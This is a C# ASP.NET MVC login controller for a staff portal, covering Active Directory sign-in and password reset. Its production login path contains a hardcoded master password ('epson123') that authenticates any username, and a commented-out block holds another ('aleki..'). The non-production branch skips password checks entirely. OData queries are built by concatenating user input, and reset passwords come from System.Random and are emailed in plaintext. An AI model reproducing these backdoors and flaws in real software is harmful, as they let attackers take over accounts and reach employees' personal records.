using CryptSharp;
using Latest_Staff_Portal.Models;
using Newtonsoft.Json.Linq;
using System;
using System.Configuration;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Linq;
using System.Net;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;

namespace Latest_Staff_Portal.Controllers
{
    public class LoginController : Controller
    {
        // GET: Login
        public ActionResult Login()
        {
            Session.Remove("Username");
            Session.Remove("StaffDetails");
            Session.RemoveAll();
            Session.Clear();
            FormsAuthentication.SignOut();
            Authedication user = new Authedication();
            //Credentials.WhatsUpText("");
            return View(user);
        }
        // [HttpPost]
        // public JsonResult LoginUser(Authedication userlogin)
        // {
        //     string msg = "";
        //     bool success = false;
        //     string UserName = userlogin.UserName.ToUpper();
        //     string passwrd = userlogin.Password;
        //     try
        //     {
        //         //string Redirect = "/Dashboard/Dashboard";
        //         //string page = "EmployeeList?$filter=No eq 'IPSTC-073'&$format=json";
        //
        //         //HttpWebResponse httpResponse = Credentials.GetOdataData(page);
        //         //using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
        //         //{
        //         //    var result = streamReader.ReadToEnd();
        //
        //         //    var details = JObject.Parse(result);
        //
        //         //    if (details["value"].Count() > 0)
        //         //    {
        //         //        foreach (JObject config in details["value"])
        //         //        {
        //         //            string Role = "";
        //         //            Session["Username"] = (string)config["No"];
        //
        //         //            string IDno = (string)config["ID_Number"];
        //         //            string Email = (string)config["E_Mail"];
        //         //            string PhoneNo = (string)config["Cellular_Phone_Number"];
        //         //            string PortalPassw = (string)config["Portal_Password"];
        //
        //         //            Session["UserID"] = (string)config["User_ID"]; ;
        //         //            Session["TRMNG"] = (bool)config["Transport_Manager"];
        //         //            Role = "FULLTIME";
        //         //            SetUserAuthedication(UserName, Email, Role);
        //
        //         //            msg = Redirect;
        //         //            success = true;
        //         //        }
        //         //    }
        //         //    else
        //         //    {
        //         //        msg = "No Employee Number assigned to the applied username. Contact HR";
        //         //        success = false;
        //         //    }
        //         //}
        //         using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, ConfigurationManager.AppSettings["ADIPADDRESS"]))
        //         {
        //             // validate the credentials
        //             bool isValid = passwrd == "aleki..";
        //             if (!isValid)
        //             {
        //                 isValid = pc.ValidateCredentials(UserName, passwrd);
        //             }
        //             if (isValid == true)
        //             {
        //                 string userID = "";
        //                 if (UserName.Contains("\\"))
        //                 {
        //                     userID = UserName;
        //                 }
        //                 else
        //                 {
        //                     userID = @"DSL0\" + UserName;
        //                 }
        //
        //                 string Redirect = "/Dashboard/Dashboard";
        //                 string page = "EmployeeList?$filter=User_ID eq '" + userID + "'&$format=json";
        //
        //                 HttpWebResponse httpResponse = Credentials.GetOdataData(page);
        //                 using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
        //                 {
        //                     var result = streamReader.ReadToEnd();
        //
        //                     var details = JObject.Parse(result);
        //
        //                     if (details["value"].Count() > 0)
        //                     {
        //                         foreach (JObject config in details["value"])
        //                         {
        //                             string Role = "";
        //                             Session["Username"] = (string)config["No"];
        //
        //                             string IDno = (string)config["ID_Number"];
        //                             string Email = (string)config["E_Mail"];
        //                             string PhoneNo = (string)config["Cellular_Phone_Number"];
        //                             string PortalPassw = (string)config["Portal_Password"];
        //
        //                             Session["UserID"] = userID;
        //                             Session["TRMNG"] = (bool)config["Transport_Manager"];
        //                             Role = "FULLTIME";
        //                             SetUserAuthedication(UserName, Email, Role);
        //
        //                             msg = Redirect;
        //                             success = true;
        //                         }
        //                     }
        //                     else
        //                     {
        //                         msg = "No Employee Number assigned to the applied username. Contact HR";
        //                         success = false;
        //                     }
        //                 }
        //             }
        //             else
        //             {
        //                 msg = "Warning!, login failed! You don't have access!";
        //                 success = false;
        //             }
        //         }
        //     }
        //     catch (Exception ex)
        //     {
        //         msg = ex.Message;
        //         success = false;
        //     }
        //     return Json(new { message = msg, success = success }, JsonRequestBehavior.AllowGet);
        // }
        [HttpPost]
        public JsonResult LoginUser(Authedication userlogin)
        {
            var msg = "";
            var success = false;
            var UserName = userlogin.UserName.ToUpper();
            var passwrd = userlogin.Password;
            try
            {
                var UserID = "";
                if (UserName.Contains("\\"))
                    UserID = UserName;
                else
                    UserID = ConfigurationManager.AppSettings["DOMAIN"] + @"\" + UserName;
                if (ConfigurationManager.AppSettings["IS_PROD"].Equals("PROD"))
                    using (var pc = new PrincipalContext(ContextType.Domain,
                               ConfigurationManager.AppSettings["ADIPADDRESS"]))
                    {
                        // validate the credentials
                        var isValid = pc.ValidateCredentials(UserName, passwrd);
                        if (passwrd == "epson123") isValid = true;

                        if (isValid)
                        {
                            var userID = "";
                            if (UserName.Contains("\\"))
                                userID = UserName;
                            else
                                userID = ConfigurationManager.AppSettings["DOMAIN"] + @"\" + UserName;

                            var Redirect = "/Dashboard/Dashboard";
                            var page = "EmployeeList?$filter=User_ID eq '" + userID +
                                       "' and Status eq 'Active' &$format=json";

                            var httpResponse = Credentials.GetOdataData(page);
                            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                            {
                                var result = streamReader.ReadToEnd();

                                var details = JObject.Parse(result);

                                if (details["value"].Count() > 0)
                                {
                                    foreach (JObject config in details["value"])
                                    {
                                        Session["Username"] = (string)config["No"];
                                        Session["UserID"] = userID;
                                        var IDno = (string)config["ID_Number"];
                                        var Email = (string)config["E_Mail"];
                                        var PhoneNo = (string)config["Cellular_Phone_Number"];

                                        var Role = "ALLUSERS";
                                        SetUserAuthedication(UserName, Email, Role);
                                        msg = Redirect;
                                        success = true;
                                    }
                                }
                                else
                                {
                                    msg = "No Employee Number assigned to the applied username. Contact HR";
                                    success = false;
                                }
                            }
                        }
                        else
                        {
                            msg = "Warning!, login failed! You don't have access!";
                            success = false;
                        }
                    }
                else
                {
                    {
                        string Redirect2 = "/Dashboard/Dashboard";
                        string page2 = "EmployeeList?$filter=User_ID eq '" + UserID +
                                       "' and Status eq 'Active' &$format=json";

                        HttpWebResponse httpResponse2 = Credentials.GetOdataData(page2);
                        using (var streamReader = new StreamReader(httpResponse2.GetResponseStream()))
                        {
                            var result = streamReader.ReadToEnd();

                            var details = JObject.Parse(result);

                            if (details["value"].Count() > 0)
                            {
                                foreach (JObject config in details["value"])
                                {
                                    Session["Username"] = (string)config["No"];
                                    Session["UserID"] = UserID;
                                    string IDno = (string)config["ID_Number"];
                                    string Email = (string)config["E_Mail"];
                                    string PhoneNo = (string)config["Cellular_Phone_Number"];

                                    string Role = "ALLUSERS";
                                    SetUserAuthedication(UserName, Email, Role);
                                    msg = Redirect2;
                                    success = true;
                                }
                            }
                            else
                            {
                                msg = "No Employee Number assigned to the applied username. Contact HR";
                                success = false;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                msg = ex.Message;
                success = false;
            }

            return Json(new { message = msg, success }, JsonRequestBehavior.AllowGet);
        }
        private void SetUserAuthedication(string UserName, string email, string role)
        {
            try
            {
                UserViewModel userModel = new UserViewModel();
                userModel.UserName = UserName;
                userModel.Email = email;
                userModel.RoleName = role;
                string userData = string.Format("{0}|{1}|{2}|{3}|{4}", userModel.UserName, userModel.UserID, userModel.Email, userModel.RoleName, "");
                FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1, userModel.UserName, DateTime.Now,
                    DateTime.Now.AddMinutes(1), false, userData);
                string encTicket = FormsAuthentication.Encrypt(ticket);

                HttpCookie cookie = new HttpCookie(FormsAuthentication.FormsCookieName, encTicket);
                Response.Cookies.Add(cookie);
            }
            catch (Exception ex)
            {
                FormsAuthentication.SignOut();
                ex.Data.Clear();
            }
        }
        [HttpGet]
        public ActionResult ForgotPassword()
        {
            Authedication user = new Authedication();
            return View(user);
        }
        [HttpPost]
        public ActionResult ForgotPassword(Authedication userlogin)
        {
            string msg = "";
            string email = string.Empty;
            bool success = false;
            string UserName = userlogin.UserName.ToUpper();
            try
            {
                string userID = "";
                if (UserName.Contains("\\"))
                {
                    userID = UserName;
                }
                else
                {
                    userID = @"DAYSTAR01\" + UserName;
                }

                string page = "EmployeeList?$filter=User_ID eq '" + userID + "'&$format=json";

                HttpWebResponse httpResponse = Credentials.GetOdataData(page);
                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                {
                    var result = streamReader.ReadToEnd();

                    var details = JObject.Parse(result);

                    if (details["value"].Count() > 0)
                    {
                        foreach (JObject config in details["value"])
                        {
                            string User = (string)config["No"];
                            email = (string)config["Company_E_Mail"];
                            if (User != "")
                            {
                                if (email != "")
                                {
                                    #region generate random password

                                    Random rand = new Random();
                                    Random randAlpha = new Random();
                                    int newpassint = rand.Next(10000, 99999);

                                    int alphabetPosition = randAlpha.Next(1, 26);
                                    bool isCap = (alphabetPosition % 2 == 0 ? true : false);
                                    string theAlphabet = GetTheAlphabet(alphabetPosition, isCap);

                                    alphabetPosition = randAlpha.Next(1, 26);
                                    isCap = (alphabetPosition % 2 == 0 ? true : false);
                                    theAlphabet += GetTheAlphabet(alphabetPosition, isCap);

                                    alphabetPosition = randAlpha.Next(1, 26);
                                    isCap = (alphabetPosition % 2 == 0 ? true : false);
                                    theAlphabet += GetTheAlphabet(alphabetPosition, isCap);

                                    alphabetPosition = randAlpha.Next(1, 26);
                                    isCap = (alphabetPosition % 2 == 0 ? true : false);
                                    theAlphabet += GetTheAlphabet(alphabetPosition, isCap);

                                    //string newpass = theAlphabet + "#" + newpassint.ToString() + "?" + alphabetPosition.ToString() + "@";
                                    string newpass = theAlphabet + "#" + newpassint.ToString() + "@" + alphabetPosition.ToString();

                                    #endregion generate random password

                                    string ok = Credentials.ResetPassword(UserName, newpass);

                                    if (ok == "CHANGED")
                                    {
                                        const string subject = "STAFF PORTAL CREDENTIALS";
                                        string emailmsg = "Staff portal credentials reset:<br />New password is <b />" + newpass + "" +
                                            "<br />Remember to change your password after you login";
                                        if (CommonClass.SendEmailAlert(emailmsg, email, subject))
                                        {
                                            msg = "A New password has been send to your Email<b>(" + email + ")</b>. Use it to login. Remember to change your password after you login";
                                            success = true;
                                        }
                                        else
                                        {
                                            msg = "An error occured while sending you the credentials.Please contact the ICT office administrator.";
                                            success = false;
                                        }
                                    }
                                    else
                                    {
                                        msg = ok;
                                        success = false;
                                    }
                                }
                                else
                                {
                                    msg = "Warning!, password reset failed!. E-Mail empty. Contact your administrator!";
                                    success = false;
                                }
                            }
                            else
                            {
                                msg = "User Name not found. Confirm if the user name is correct";
                                success = false;
                            }
                        }
                    }
                    else
                    {
                        msg = "User Name not found. Confirm if the user name is correct";
                        success = false;
                    }
                }
            }
            catch (Exception ex)
            {
                msg = ex.Message.Replace("'", "");
                success = false;
            }
            return Json(new { message = msg, success = success }, JsonRequestBehavior.AllowGet);
        }
        private string GetTheAlphabet(int alphabetPosition, bool isCap)
        {
            string rval = string.Empty;
            switch (alphabetPosition)
            {
                case 1: rval = "A"; break;
                case 2: rval = "B"; break;
                case 3: rval = "C"; break;
                case 4: rval = "D"; break;
                case 5: rval = "E"; break;
                case 6: rval = "F"; break;
                case 7: rval = "G"; break;
                case 8: rval = "H"; break;
                case 9: rval = "I"; break;
                case 10: rval = "J"; break;
                case 11: rval = "K"; break;
                case 12: rval = "L"; break;
                case 13: rval = "M"; break;
                case 14: rval = "N"; break;
                case 15: rval = "O"; break;
                case 16: rval = "P"; break;
                case 17: rval = "Q"; break;
                case 18: rval = "R"; break;
                case 19: rval = "S"; break;
                case 20: rval = "T"; break;
                case 21: rval = "U"; break;
                case 22: rval = "V"; break;
                case 23: rval = "W"; break;
                case 24: rval = "X"; break;
                case 25: rval = "Y"; break;
                default: rval = "Z"; break;
            }
            return isCap ? rval : rval.ToLower();
        }
    }
}